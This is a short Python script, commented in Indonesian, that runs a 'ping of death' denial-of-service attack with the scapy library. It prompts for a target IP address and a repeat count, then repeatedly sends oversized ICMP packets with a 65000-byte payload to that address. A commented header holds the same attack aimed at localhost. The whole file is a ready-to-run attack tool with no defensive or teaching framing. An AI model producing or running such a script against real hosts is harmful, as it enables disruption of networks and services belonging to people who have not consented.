#------------------------------------------------------------
# from scapy.all import *

# p=IP(dst='127.0.0.1', flags=2, frag=0)/ICMP()/("x"*65000)
# send(p, verbose=0, loop=1)
#------------------------------------------------------------

# Mengimpor library
from scapy.all import *

# Sebuah fungsi dengan parameter untuk menampung proses
def PoD(Ip, loop):
    # Proses pembentukkan paket
    p = IP(dst = Ip, flags = 2, frag = 0) / ICMP() / ("x" * 65000)
    
    # Mengirim paket yang dibentuk pada proses diatas
    send(p, verbose = 0, loop = loop)

# Sebuah pengkondisian if untuk menjalankan program    
if __name__ == "__main__":
    Ip = str(input("Enter IP address of target >> ")) # Memasukkan alamat IP target
    loop_of_attack = int(input("Enter loop of attack >> ")) # Memasukkan jumlah serangan yang diulang
    PoD(Ip, loop_of_attack) # Memanggil fungsi dengan parameter untuk menjalankan serangan ping of death